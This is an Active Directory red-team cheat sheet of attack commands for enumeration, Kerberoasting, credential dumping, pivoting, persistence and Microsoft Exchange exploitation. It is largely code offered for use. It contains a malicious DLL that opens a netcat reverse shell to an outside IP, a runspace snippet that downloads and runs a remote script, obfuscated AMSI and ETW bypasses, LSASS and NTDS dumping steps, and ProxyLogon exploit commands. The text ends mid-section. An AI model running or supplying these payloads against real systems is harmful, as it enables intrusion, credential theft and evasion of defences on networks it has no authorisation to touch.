# Red Team Cheat sheet

### Summary

* [AD Exploitation Cheat Sheet by RistBS](broken-reference)
  * [Summary](broken-reference)
  * [Tools](broken-reference)
  * [Powershell Components](broken-reference)
    * [Powershell Tricks](broken-reference)
    * [PSWA Abusing](broken-reference)
  * [Enumeration](broken-reference)
    * [GPO enumeration](broken-reference)
    * [ACL and ACE enumeration](broken-reference)
    * [RID Cycling](broken-reference)
  * [Privilege Escalation](broken-reference)
    * [Token Impersonation](broken-reference)
    * [Kerberoasting](broken-reference)
    * [ASREPRoasting](broken-reference)
    * [DNSAdmin](broken-reference)
  * [Lateral Mouvement](broken-reference)
    * [WMIExec](broken-reference)
  * [Credentials Dumping](broken-reference)
    * [LSASS Dumping](broken-reference)
    * [NTDS Dumping](broken-reference)
    * [DPAPI Abusing](broken-reference)
    * [LSA Dumping](broken-reference)
    * [SAM Dumping](broken-reference)
    * [Dump Registry Remotely and Directly](broken-reference)
    * [Read GMSA Passwords](broken-reference)
  * [Hash Cracking](broken-reference)
  * [Bruteforce AD Password](broken-reference)
    * [Custom Username and Password wordlist](broken-reference)
  * [Pivoting](broken-reference)
    * [SMB Pipes](broken-reference)
    * [SharpSocks](broken-reference)
    * [RDP Tunneling via DVC](broken-reference)
  * [Persistence](broken-reference)
    * [SIDHistory Injection](broken-reference)
    * [AdminSDHolder and SDProp](broken-reference)
  * [ACLs and ACEs Abusing](broken-reference)
    * [GenericAll](broken-reference)
  * [Enhanced Security Bypass](broken-reference)
    * [AntiMalware Scan Interface](broken-reference)
    * [ConstrainLanguageMode](broken-reference)
    * [Just Enough Administration](broken-reference)
    * [ExecutionPolicy](broken-reference)
    * [RunAsPPL for Credentials Dumping](broken-reference)
    * [ETW Disabling](broken-reference)
  * [MS Exchange](broken-reference)
    * [OWA, EWS and EAS Password Spraying](broken-reference)
    * [GAL and OAB Extraction](broken-reference)
    * [PrivExchange](broken-reference)
    * [ProxyLogon](broken-reference)
    * [CVE-2020-0688](broken-reference)
  * [MSSQL Server](broken-reference)
    * [UNC Path Injection](broken-reference)
    * [MC-SQLR Poisoning](broken-reference)
    * [DML, DDL and Logon Triggers](broken-reference)
  * [Forest Persistence](broken-reference)
    * [DCShadow](broken-reference)
  * [Cross Forest Attacks](broken-reference)
    * [Trust Tickets](broken-reference)
    * [Using KRBTGT Hash](broken-reference)
  * [Azure Active Directory (AAD)](broken-reference)
    * [AZ User Enumeration](broken-reference)
    * [PowerZure](broken-reference)
    * [Golden SAML](broken-reference)
    * [PRT Manipulation](broken-reference)
    * [MSOL Service Account](broken-reference)
  * [Miscs](broken-reference)
    * [Domain Level Attribute](broken-reference)
      * [MachineAccountQuota (MAQ) Exploitation](broken-reference)
      * [Bad-Pwd-Count](broken-reference)
    * [Abusing IPv6 in AD](broken-reference)
      * [Rogue DHCP](broken-reference)
      * [IOXIDResolver Interface Enumeration](broken-reference)
    * [References](broken-reference)

### Tools

**Powershell tools :**

* `[⭐] Nishang` -> [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

nishang has multiples useful scripts for windows pentesting in Powershell environement.

* `[⭐] PowerView` -> [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

powerview is a script from powersploit that allow enumeration of the AD architecture for a potential lateral mouvement.

**Enumeration tools :**

* `[⭐] Bloodhound` -> [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
* `[⭐] crackmapexec` -> [https://github.com/byt3bl33d3r/CrackMapExe](https://github.com/byt3bl33d3r/CrackMapExe)

**AD exploitation toolkit :**

* `[⭐] Impacket` -> [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
* `[⭐] kekeo` -> [https://github.com/gentilkiwi/kekeo](https://github.com/gentilkiwi/kekeo)

**Dumping Tools :**

* `[⭐] mimikatz` -> [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
* `[⭐] rubeus` -> [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

**Listener Tool :**

* `[⭐] responder` -> [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

### Powershell Components

#### Powershell Tricks

**PS-Session** :

```
#METHOD 1
$c = New-PSSession -ComputerName 10.10.13.100 -Authentication Negociate -Credential $user
Enter-PSSession -Credential $c -ComputerName 10.10.13.100

# METHOD 2
$pass = ConvertTo-SecureString 'Ab!Q@aker1' -asplaintext -force
$cred = New-Object System.Management.Automation.PSCredential('$user, $pass')
Enter-PSSession -Credential $c -ComputerName 10.10.13.100
```

#### PSWA Abusing

allow anyone with creds to connect to any machine and any config

**\[ ! ] this action require credentials.**

```
Add-PswaAuthorizationRule -UsernName * -ComputerName * -ConfigurationName *
```

### Enumeration

#### Find user with SPN

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :

> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Trusts Enumeration

**MapTrust :**

**Domain trusts for the current domain :**

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :

```
Get-NetDomainTrust #Find potential external trust
Get-NetDomainTrust –Domain $domain
```

> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :

```
Get-ADTrust
Get-ADTrust –Identity $domain
```

#### Forest Enumeration

**Details about the current forest :**

```
Get-NetForest
Get-NetForest –Forest $forest
Get-ADForest
Get-ADForest –Identity $domain
```

#### GPO enumeration

**List of GPO**

```
Get-NetGPO
Get-NetGPO -ComputerName $computer
Get-GPO -All
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
```

#### ACL and ACE enumeration

**Enumerate All ACEs**

```
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
```

**Enumerate users and permissions**

```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
```

_Verify if the user already has a SPN :_

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :

```
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :

```
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

#### LDAP Enumeration

```
ldapsearch -x -h 10.10.10.x -p 389 -s base namingcontexts
ldapsearch -h 10.10.10.x -p 389 -x -b "dc=boxname,dc=local"
```

_find service accounts_

```
ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=box,dc=local" | grep "service"
```

_Enumeration with ldapsearch as authenticated user_

```
ldapsearch -x -h ldap.megacorp.corp -w '$pass'
ldapsearch -x -h 10.10.131.164 -p 389 -b "dc=megacorp,dc=corp" -D 'john@megacorp.corp' -w 'vs2k6!'
ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -s base namingcontexts
ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -b 'dc=megacorp'
```

_Enumeration with ldapdomaindump (authenticated) with nice output_

```
ldapdomaindump 10.10.197.117 -u 'megacorp.corp\john' -p '$pass' --no-json --no-grep
```

_Enumeration with nmap scripts_

```
nmap -p 389 --script ldap-search 10.10.10.x
nmap -n -sV --script "ldap*" -p 389 10.10.10.x
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='MEGACORP.CORP',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.13.100
```

#### SMB Enumeration

_enumeration with crackmapexec as unauthenticated_

```
crackmapexec smb 10.10.10.x --pass-pol -u '' -p ''
```

_enumeration with crackmapexec (authenticated)_

```
crackmapexec smb 10.10.11.129 --pass-pol -u usernames.txt -p $pass --continue-on-sucess
crackmapexec smb 10.10.11.129 --pass-pol -u xlsx_users -p $pass --continue-on-sucess
```

_enumeration with kerbrute, against Kerberos pre-auth bruteforcing:_

```
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.local --dc 10.10.13.100 -o kerbrute.out users.txt
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.htb --dc 10.10.13.100 -o kerbrute.out users.lst --downgrade
```

> by default, kerbrute uses the most secure mode (18 = sha1) to pull some hash. Using the downgrade option we can pull the deprecaded encryption type version (23 = rc4hmac). Or use getNPusers to get some hash instead, it's safer!

_provide a password or a list of passwords to test against users_

```
crackmapexec smb 10.10.13.100 --pass-pol -u users.lst -p password_list
```

_Enumerate some users_

```
crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
```

#### Password Spraying on the domain

```
/opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
```

**Dump Domain, Groups and Users using Bloodhound-Python:**

```
bloodhound-python -c all -u $user -p $password -d $domain -dc $dc_domain -ns $ip --disable-pooling -w1 --dns-timeout 30
```

Setting up Bloodhound:

```
sudo neo4j console
sudo bloodhound
```

### RID Cycling

_Global Structure :_

```
S-1-5-21-40646273370-24341400410-2375368561-1036
```

* `S-1-5-21`: **S refers SID (Security Identifier)**
* `40646273370-24341400410-2375368561`: **Domain or Local Computer Identifier**
* `1036`: **RID (Relative Identifier)**

_User SID Structure :_

* `S-1-5-21-40646273370-24341400410-2375368561`: **Domain SID**
* `1036`: **User RID**

> using [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) :

```
cme smb $target -u $username -p $password --rid-brute
```

> using [lookupsid](https://github.com/SecureAuthCorp/impacket/blob/cd4fe47cfcb72d7d35237a99e3df95cedf96e94f/examples/lookupsid.py) :

```
lookupsid.py MEGACORP/$user:'$password'@$target 20000
```

the value "20000" in lookupsid is to indicate how many RID will be tested

### Privilege Escalation

#### Token Impersonation

> The Impersonation token technique allows to impersonate a user by stealing his token, this token allows to exploit this technique because of the SSO processes, Interactive Logon, process running...

> using [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :

_list tokens_

```
# Show all tokens
Invoke-TokenManipulation -ShowAll
# show usable tokens
Invoke-TokenManipulation -Enumerate
```

_Start a new process with the token of a user_

```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
```

_process token manipulation_

```
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe -ProcessId $id
```

> using [Incognito](https://github.com/FSecureLABS/incognito) :

_load incognito and list tokens :_

```
meterpreter > use incognito
meterpreter > list_tokens -g
```

_impersonate token of "NT AUTHORITY\SYSTEM" :_

```
meterpreter > getuid
Server username: job\john
meterpreter > impersonate_token "BUILTIN\Administrators"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Kerberoasting

**Enumerate kerberoastable user**

```
Get-DomainUser -SPN | select name,serviceprincipalname
```

> using [impacket](https://github.com/SecureAuthCorp/impacket) :

```
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
```

> using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)

```
crackmapexec ldap $target -u $user -p $password --kerberoasting kerberoastable.txt --kdcHost $kdc
```

_crack the hash :_

```
# using JTR :
john --format=krb5tgs spn.txt --wordlist=wordlist.txt
# using hashcat :
hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
```

#### ASREPRoasting

**Enumerate asreproastable user**

```
Get-DomainUser -PreauthNotRequired | select name
```

```
GetNPUsers.py -format hashcat -outputfile ASREProastables.txt -dc-ip $kdc '$domain/$user:$password' -request
```

_cracking the hash :_

`hashcat -m 18200 -a 0 hash wordlist.txt --force`

#### DNSAdmin

> Enumerate users in this group :

```
# METHOD 1
Get-NetGroupMember -GroupName "DNSAdmins"
# METHOD 2
Get-ADGroupMember -Identity DNSAdmins
```

_This attack consists of injecting a malicious arbitrary DLL and restarting the dns.exe service, since the DC serves as a DNS service, we can elevate our privileges to a DA._

> DLL File :

```
#include "stdafx.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.51 5555");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

you can also create a dll file using msfvenom : `msfvenom -p windows/x64/exec cmd='net user administrator aked /domain' - f dll > evil.dll` it'll execute `net user administrator aked /domain` with SYSTEM privileges

set the remote DLL path into the Windows Registry

```
dnscmd dc01 /config /serverlevelplugindll \\10.10.14.33\share\evil.dll
```

`\\10.10.14.33\share\evil.dll` : SMB Share.

**restart DNS service**

```
sc.exe stop dns
sc.exe start dns
```

### Lateral Mouvement

#### WMIExec

_uses kerberos auth_

```
impacket-wmiexec -k -no-pass administrator@10.10.10.248
```

### Credentials Dumping

#### LSASS Dumping

```
cme <protocol> <ip> -u <user> -p <pass> -M lsassy
```

* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)

```
procdump --accepteula -ma lsass lsass.dmp
```

```
smbclient.py MEGACORP.LOCAL/john@dc01.megacorp.local
# use C$
# cd Windows\Temp
# put procdump.exe
```

```
psexec.py MEGACORP.LOCAL/john@dc01.megacorp.local "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"
```

```
smbclient.py MEGACORP.LOCAL/john@dc01.megacorp.local
# get lsass.dmp
```

> parse creds with mimikatz

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

you can do it locally with mimikatz using : `sekurlsa::logonpasswords`.

#### NTDS Dumping

**Abusing DRSUAPI for NTDS dumping**

```
crackmapexec smb 10.10.13.100 -u 'Administrator' -p $password --ntds drsuapi
```

**Abusing VSS for NTDS dumping**

> using Crackmapexec :

```
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds vss
```

_you can do it manually too._

```
vssadmin create shadow /for=C:
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
vssadmin delete shadows /shadow=$ShadowCopyId
```

#### DPAPI Abusing

> dump DPAPI BK

```
dpapi.py backupkeys -t $domain/$user:$password@$target
```

> Decrypt DPAPI MK

```
# Decrypt DPAPI MK using BK
dpapi.py masterkey -file "/path/to/masterkey" -pvk "/path/to/backup_key.pvk"
# Decrypt DPAPI MK using MK password and user SID
dpapi.py masterkey -file "/path/to/masterkey" -sid $USER_SID -password $mk_password
```

> decrypting protected file using MK

```
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```

_crack DPAPI master key with JTR_

```
python DPAPImk2john.py --sid="$SID" --masterkey="$MASTER_KEY" --context="local"
john dpapimk.dmp --wordlist=/usr/share/wordlists/rockyou.txt --rules=custom.rule
```

#### LSA Dumping

**you can use mimikatz with this command : `lsadump::secrets`**

#### SAM Dumping

_save SYSTEM hive and SAM in another directory_

```
reg save HKLM\SAM c:\path\to\SAM
reg save HKLM\SYSTEM c:\path\to\SYSTEM
```

```
lsadump::sam /system:c:\path\to\SYSTEM /sam:c:c:\path\to\SAM
```

or just use : `lsadump::sam`

**\[ 📝 ] Notes** : _you can dump SAM and LSA with crackmapexec **or** secretdump using these commands :_

```
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

```
crackmapexec smb $ip -d $domain -u $user -p $password --sam/--lsa
```

#### Dump Registry Remotely and Directly

\[ ❓ ] **What is Registry ?** : the Registry is divided into several sections called **hives**. A registry hive is a top level registry key predefined by the Windows system to store **registry keys** for specific objectives. Each registry hives has specific objectives, there are **6 registry hives, HKCU, HKLM, HKCR, HKU, HKCC and HKPD** the most enteresting registry hives in pentesting is HKU and HKLM.

**HKEY\_LOCAL\_MACHINE** called HKLM includes three keys SAM, SYSTEM, and SECURITY.

> dump SYSTEM and SECURITY remotely from HKLM :

```
secretsdump.py local -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile hashes
```

> dump HKU registry remotely with hashes argument :

```
impacket-reg -hashes :34ed87d42adaa3ca4f5db34a876cb3ab domain.local/john.doe@job query -keyName HKU\\Software

HKU\Software
HKU\Software\GiganticHostingManagementSystem
HKU\Software\Microsoft
HKU\Software\Policies
HKU\Software\RegisteredApplications
HKU\Software\Sysinternals
HKU\Software\VMware, Inc.
HKU\Software\Wow6432Node
HKU\Software\Classes
```

#### Read GMSA Password

```
$user = 'USER'
$gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$cred = New-Object System.Management.Automation.PSCredential $user, $mp.SecureCurrentPassword
```

_gMSA dumping:_

```
python3 gMSADumper.py -u $user -p $password -d $domain.local
```

### Hash Cracking

> LM :

```
# using JTR :
john --format=lm hash.txt
# using hashcat :
hashcat -m 3000 -a 3 hash.txt
```

> NT :

```
# using JTR :
john --format=nt hash.txt --wordlist=wordlist.txt
# using hashcat :
hashcat -m 1000 -a 3 hash.txt
```

> NTLMv1 :

```
# using JTR :
john --format=netntlmv1 hash.txt
# using hashcat :
hashcat -m 5500 --force -a 0 hash.txt wordlist.txt
```

> NTLMv2 :

```
# using JTR :
john --format=netntlmv2 hash.txt
# using hashcat :
hashcat -m 5600 --force -a 0 hash.txt wordlist.txt
```

note : some Hash Type in hashcat depend of the **etype**

### Bruteforce AD Password

#### Custom Username and Password wordlist

default password list (pwd\_list) : `Autumn Spring Winter Summer` create passwords using bash & hashcat :

```
for i in $(cat pwd_list); do echo $i, echo ${i}\!; echo ${i}2019; echo ${i}2020 ;done > pwds
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule -r /usr/share/hashcat/rules/toogles1.r | sort u
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule -r /usr/share/hashcat/rules/toogles1.r | sort u | awk 'length($0) > 7' > pwlist.txt
```

default username list (users.list) :

```
john doe
paul smith
jacaques miller
```

create custom usernames using username-anarchy :

```
./username-anarchy --input-file users.list --select-format first,first.last,f.last,flast > users2.list
```

### Pivoting

**Pivot with WDFW via custom rules**

```
netsh interface portproxy add v4tov4 listenaddress=LOCAL_ADDRESS listenport=LOCALPORT connectaddress=REMOTE_ADDRESS connectport=REMOTE_PORT protocol=tcp
```

_allow connections to localport_

```
netsh advfirewall firewall add rule name="pivot like a pro" protocol=TCP dir=in localip=LOCAL_ADDRESS localport=LOCAL_PORT action=allow
```

#### SMB Pipes

**Local/Remote ports can be forwarded** using **SMB pipes**. You can use [Invoke-Piper](https://github.com/p3nt4/Invoke-Piper) or [Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy) for that.

* `Invoke-Piper` : _used to forward local or remote ports_
* `Invoke-SocksProxy` : _used for dynamic port forwarding_

**Case 1** _Local port forwarding through pipe forPivot: `-L 33389:127.0.0.1:3389`_

> SERVER SIDE :

```
Invoke-PiperServer -bindPipe forPivot -destHost 127.0.0.1 -destPort 3389
```

> CLIENT SIDE :

```
Invoke-PiperClient -destPipe forPivot -pipeHost $server_ip -bindPort 33389
```

**Case 2** _Admin only remote port forwarding through pipe forPivot: `-R 33389:127.0.0.1:3389`_

> SERVER SIDE :

```
Invoke-PiperServer -remote -bindPipe forPivot -bindPort 33389 -security Administrators
```

> CLIENT SIDE :

```
Invoke-PiperClient -remote -destPipe forPivot -pipeHost $server_ip -destHost 127.0.0.1 -destPort 3389
```

**Case 3** _Dynamic port forwarding with Invoke-SocksProxy with forPivot as NamedPipe: `-D 3333`_

> SERVER SIDE :

```
Invoke-SocksProxy -bindPort 3333
Invoke-PiperServer -bindPipe forPivot -destHost 127.0.0.1 -destPort 3333
```

> CLIENT SIDE :

```
Invoke-PiperClient -destPipe forPivot -pipeHost $server_ip -bindPort 3333
```

#### SharpSocks

**SharpSocks is mostly used in C2 Frameworks and work with C2 Implants**

_build a server:_

```
PS> .\SharpSocksServer.exe --cmd-id=$id --http-server-uri=$uri --encryption-key=$key -v
```

#### RDP Tunneling via DVC

_sharings drives:_

```
PS > regsvr32 UDVC-Plugin.dll
PS > subst.exe x: C:\Users\john\RDP_Tools
```

_map the drives:_

```
PS > net use x: \\TSCLIENT\X
```

create a server with SSFD.exe

_Redirect SSF port with DVC server:_

```
PS > ./UDVC-Server.exe -c -p 8080 -i 127.0.0.1

[*] Setting up client socket
[*] Connected to: 127.0.0.1:8080
[*] Starting thread RsWc
[*] Starting thread RcWs
[*] Wait for threads to exit...
```

_SSFD as a SOCK proxy_

```
PS > ssf.exe -D 9090 -p 31337 127.0.0.1
```

### Persistence

#### SIDHistory Injection

#### AdminSDHolder and SDProp

> \[ ❓ ] : With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :

```
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights All -Verbose
```

> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :

```
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=megacorp,DC=megacorp,DC=local' -Principal $user -Verbose
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights ResetPassword -Verbose
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights WriteMembers -Verbose
```

_Run SDProp manually_

```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

### ACLs and ACEs Abusing

#### GenericAll

**list all groups to which the user belongs and has explicit access rights**

```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
net group Administrator aker /add /domain
```

### Enhanced Security Bypass

#### AntiMalware Scan Interface

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

patching AMSI from Powershell6 :

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### ConstrainLanguageMode

Bypass CLM using **runspace**:

```
static void Main(string[] args){
    Runspace run = RunspaceFactory.CreateRunspace();
    run.Open();

    PowerShell shell = PowerShell.Create();
    shell.Runspace = run;

    String cmd = "iex(new-object net.webclient).DownloadString('http://10.10.14.33/script')";
    shell.AddScript(cmd);
    shell.Invoke();
    run.Close();
}
```

#### Just Enough Administration

> show current languages level :

```
# METHOD 1
(Get-PSSessionConfiguration -Name Test).LanguageMode
# METHOD 2
$ExecutionContext.SessionState.LanguageMode # use property
```

> Bypass JEA in ConstrainedLanguage :

```
{ C:\Windows\System32\spool\drivers\color\nc.exe -e powershell.exe 10.10.14.33 9003 }
```

#### ExecutionPolicy

```
powershell -ExecutionPolicy Bypass -File C:\script.ps1
```

> bypass EP using encoding :

```
$command = "Write-Host 'hello world'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encoded = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encoded
```

#### RunAsPPL for Credentials Dumping

\[ ❓ ] : [RunAsPPL](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) is an **additional LSA protection** to prevent reading memory and code injection by **non-protected processes**.

> bypass RunAsPPL with mimikatz :

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

#### ETW Disabling

```
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

you can try obfuscation techniques on this command. To learn more about ETW see my course [here](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/exploit-development/FR%20-%20ETW%20Bypassing.md)

### MS Exchange

#### OWA EWS and EAS Password Spraying

> using [MailSniper](https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1) :

```
# OWA (Outlook web App)
Invoke-PasswordSprayOWA -ExchHostname $domain -UserList .\users.txt -Password $password
# EAS (Exchange ActivSync)
Invoke-PasswordSprayEAS -ExchHostname $domain -UserList .\users.txt -Password $password
# EWS (Exchange Web Service)
Invoke-PasswordSprayEWS -ExchHostname $domain -UserList .\users.txt -Password $password
```

> using [ruler](https://github.com/sensepost/ruler) :

```
./ruler -domain $domain --insecure brute --userpass $userpass.txt -v
```

#### GAL and OAB Extraction

**GAL (Global Address Book) Extraction**

```
./ruler -k -d $domain -u $user -p $password -e user@example.com --verbose abk dump -o email_list.txt
```

> using powershell :

```
PS C:\> Get-GlobalAddressList -ExchHostname mx.megacorp.com -UserName $domain\$user -Password $password -OutFile email_list.txt
```

**OAB (Offline Address Book) Extraction**

_extract OAB.XML file which contains records_

```
curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/oab.xml > oab.xml

cat oab.xml |grep '.lzx' |grep data
```

_extract LZX compressed file_

```
curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/$OABId-data-1.lzx > oab.lzx

./oabextract oab.lzx oab.bin && strings oab.bin |egrep -o "(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])" | sort -u > emails.txt
```

> using [oaburl.py](https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438) :

```
./oaburl.py $domain/$user:$password@domain.com -e valid@domain.com
```

#### PrivExchange

[**PrivExchange**](https://github.com/dirkjanm/PrivExchange) **use PushSubscription Feature, a user is able to capture the NTLM authentication data of an Exchange server With a simple call to the "PushSubscription" API**

```
responder -I eth0 -Av
python3 privexchange.py -d $domain -u $user -p $password -ah -ap '/test/test/test' mx.server.com --debug
```

#### ProxyLogon

[**ProxyLogon**](https://github.com/hausec/ProxyLogon) **is the name given to CVE-2021-26855 that allows an attacker to bypass authentication and impersonate users on MS Exchange servers**

```
python proxylogon.py $ip user@fqdn
```

> using metasploit:

```
use auxiliary/scanner/http/exchange_proxylogon
use auxiliary/gather/exchange_proxylogon
use exploit/windows/http/exchange_proxylogon_rce
```

#### CVE-2020-0688

this CVE allow RCE on EWS through fixed cryptographic keys

_Get Values for RCE :_

* _ViewStateUserKey_ : `document.getElementById("_VIEWSTATEGENERATOR").value`
* _ViewStateGenerator_ : `ASP.NET_SessionId`

```
